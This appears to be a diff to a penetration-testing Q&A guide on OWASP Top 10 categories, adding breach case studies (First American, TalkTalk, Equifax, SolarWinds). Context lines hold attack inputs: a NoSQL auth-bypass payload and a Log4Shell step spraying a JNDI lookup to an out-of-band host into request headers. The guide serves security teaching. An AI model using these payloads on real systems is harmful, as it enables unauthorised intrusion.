@@ -138,7 +138,7 @@ Baseline **High** (cross-user PII disclosure via IDOR/BOLA, CWE-639). Escalate: 
 That's **security by obscurity** — a UUID leaked elsewhere (referrer, logs, another endpoint, an email) is still accepted because the server never checks *ownership*. Unguessable IDs are defense-in-depth; the real fix is the per-object authorization check.
 
 ### Q25. Real-world A01 examples?
-Facebook/Instagram-class IDOR mass account access; mass-assignment privilege escalation (`isAdmin` in body); admin panels via forced browsing; JWT `role` tampering. Among the highest-paid bug classes.
+**First American Financial (2019)** is the headline: a title-insurance app served documents at **sequential, unauthenticated URLs**, so incrementing the ID walked through **~885 million** files (SSNs, bank statements, driver's-license images) — pure IDOR, no login. Also: mass-assignment privilege escalation (`isAdmin` in body); admin panels via forced browsing; JWT `role` tampering; BOLA in APIs (API1). Among the highest-paid bug classes because one flaw leaks *everyone's* data.
 
 ### Q26. CWEs for A01?
 CWE-284 (Improper Access Control), CWE-285 (Improper Authorization), **CWE-639** (IDOR / authz via user-controlled key), CWE-862 (Missing Authorization), CWE-863 (Incorrect Authorization), CWE-732, CWE-22. Cite CWE-639 for IDOR.
@@ -273,7 +273,7 @@ Content-Security-Policy restricts which script sources execute (nonce/hash/allow
 CWE-79 (XSS), CWE-89 (SQLi), CWE-78 (OS command), CWE-90 (LDAP), CWE-91/643 (XML/XPath), CWE-94 (code), CWE-1336/917 (template/expression-language), CWE-74 (generic injection).
 
 ### Q55. Real-world A03 examples?
-Endless SQLi breaches; SSTI-to-RCE (Jinja2/Twig); command injection in image/PDF processors (ImageTragick, Ghostscript); stored XSS session theft; NoSQLi auth bypass (`{"$ne":null}`).
+**TalkTalk (2015)** — a plain **SQL injection** on unpatched legacy pages exposed **156,959 customers** (15,656 with bank details) and drew a then-record **£400,000** ICO fine because the same flaw had been exploited months earlier and left unfixed. Also: SSTI-to-RCE (Jinja2/Twig); command injection in image/PDF processors (ImageTragick, Ghostscript); stored XSS session theft; NoSQLi auth bypass (`{"$ne":null}`).
 
 ### Q56. What's the difference between a WAF blocking a payload and the bug being fixed?
 A **WAF** is a bypassable edge filter matching known patterns — it doesn't fix the code. The bug is fixed only when the sink is made safe (parameterization/encoding). Always report the underlying bug; note the WAF as mitigation, not remediation.
@@ -430,7 +430,7 @@ Not by itself. Confirm the specific CVE's vulnerable code path is **reachable** 
 Inventory components (**SBOM**); patch/update continuously; monitor advisories for your stack; remove unused deps; pin + verify integrity; run **SCA** in CI.
 
 ### Q80. Real-world A06 examples + CWEs?
-Log4Shell (Log4j RCE); Struts/Spring4Shell; deserialization RCE via ysoserial/PHPGGC gadgets; vulnerable jQuery/AngularJS → XSS; typosquatted npm/PyPI (→ `DependencyConfusion/`). CWEs: CWE-1104, CWE-937/1035.
+**Equifax (2017)** is the definitive case: an **unpatched Apache Struts** RCE (**CVE-2017-5638**, patch available the day it was disclosed) was exploited **3 days later**, leading to **147.9 million** people breached — a *catalogued, fixable* component left unpatched. Also: Log4Shell (Log4j RCE); Spring4Shell; deserialization RCE via ysoserial/PHPGGC gadgets; vulnerable jQuery/AngularJS → XSS; typosquatted npm/PyPI (→ `DependencyConfusion/`). CWEs: CWE-1104, CWE-937/1035.
 
 ### Q80a. Walk a Log4Shell (CVE-2021-44228) test end-to-end.
 1. **Spray** a JNDI lookup into every field that might be *logged* — `User-Agent`, `X-Forwarded-For`, `Referer`, other headers, the username/search/any input: `${jndi:ldap://<token>.oob.net/x}` with a **per-input token** so you know which field fired.
@@ -527,7 +527,7 @@ Because deserialization can *reconstruct arbitrary object graphs* and invoke met
 Avoid deserializing untrusted data (or safe formats + type allow-lists + integrity/signature checks); **sign + verify** updates/plugins/artifacts; verify dependency integrity/provenance + pin; secure the CI/CD pipeline (least privilege, signed builds, no injectable steps); never trust unsigned data for security decisions.
 
 ### Q99. Real-world A08 examples + CWEs?
-ysoserial Java RCE; .NET ViewState RCE via leaked machineKey; PHP phar/POP-chain RCE; SolarWinds CI/CD compromise; dependency-confusion RCE in CI. CWEs: **CWE-502** (deserialization), CWE-345 (insufficient integrity), CWE-494 (download without integrity check), CWE-829, CWE-565.
+**SolarWinds / SUNBURST (2020)** is the archetype: attackers compromised the **Orion build pipeline** and shipped a **validly code-signed** trojanised update to **18,000+** organisations — the integrity chain was broken at the source, so every downstream signature check passed. Also: ysoserial Java RCE; .NET ViewState RCE via leaked machineKey; PHP phar/POP-chain RCE; dependency-confusion RCE in CI. CWEs: **CWE-502** (deserialization), CWE-345 (insufficient integrity), CWE-494 (download without integrity check), CWE-829, CWE-565.
 
 ### Q99a. How do you recognise a serialized blob (magic bytes) per language?
 Fingerprint the format before attacking it:
